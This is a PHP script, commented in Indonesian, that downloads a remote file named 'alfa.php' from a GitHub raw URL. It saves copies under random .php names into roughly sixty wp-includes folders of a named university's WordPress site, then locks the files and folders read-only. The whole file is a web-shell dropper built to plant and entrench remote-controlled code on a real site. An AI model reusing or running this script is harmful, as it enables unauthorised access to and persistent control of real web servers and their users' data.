<?php

function download_and_save_to_multiple_dirs(array $files, array $save_dirs) {
    $options = [
        'http' => [
            'header' => "User-Agent: Mozilla/5.0\r\n"
        ]
    ];
    $context = stream_context_create($options);

    foreach ($save_dirs as $dir) {
        if (!is_dir($dir)) {
            echo "Folder '$dir' belum ada. Mencoba membuat...\n";
            if (!mkdir($dir, 0777, true)) {
                echo "❌ Gagal membuat folder: $dir\n";
                continue;
            }
            echo "✅ Folder '$dir' berhasil dibuat.\n";
        } else {
            echo "📁 Folder '$dir' sudah ada.\n";
        }
    }

    foreach ($files as $file) {
        $url = $file['url'];
        echo "⬇️  Downloading: $url\n";
        $content = @file_get_contents($url, false, $context);
        if ($content === false) {
            echo "❌ Gagal download dari $url\n";
            continue;
        }

        foreach ($save_dirs as $dir) {
            $random_number = rand(100000, 999999);
            $save_path = rtrim($dir, '/') . '/' . $random_number . '.php';
            if (file_put_contents($save_path, $content) !== false) {
                echo "✅ File disimpan ke: $save_path\n";
                chmod($save_path, 0444);
            } else {
                echo "❌ Gagal simpan file ke: $save_path\n";
            }
        }
    }

    foreach ($save_dirs as $dir) {
        chmod($dir, 0555);
        echo "🔧 Permission folder '$dir' di-set ke 0555\n";
    }
}

$files_to_download = [
    ['url' => 'https://raw.githubusercontent.com/erosjoko5/solo/refs/heads/main/alfa.php', 'save_name' => '32165465.php'],
];

$save_directories = [
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/archives/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/audio/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/avatar/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/button/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/calendar/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/categories/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/code/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/columns/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/cover/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/embed/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/file/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/gallery/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/group/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/heading/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/html/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/image/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/latest-comments/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/latest-posts/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/list/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/media-text/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/navigation/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/paragraph/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/preformatted/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/pullquote/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/quote/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/rss/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/search/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/separator/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/site-logo/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/site-title/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/social-links/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/spacer/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/table/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/tag-cloud/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/text-columns/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/verse/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/blocks/video/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/cache/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/certificates/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/compat/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/customize/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/fonts/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/http/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/js/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/js/tinymce/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/js/tinymce/langs/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/js/tinymce/plugins/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/pomo/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/random_compat/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/random_compat/lib/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/Requests/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/Requests/Cookie/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/Requests/Exception/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/Requests/Transport/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/SimplePie/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/SimplePie/Cache/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/SimplePie/Parser/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/sodium_compat/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/sodium_compat/lib/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/theme-compat/',
'/home/dif.telkomuniversity.ac.id/public_html/wp-includes/widgets/'
];

download_and_save_to_multiple_dirs($files_to_download, $save_directories);
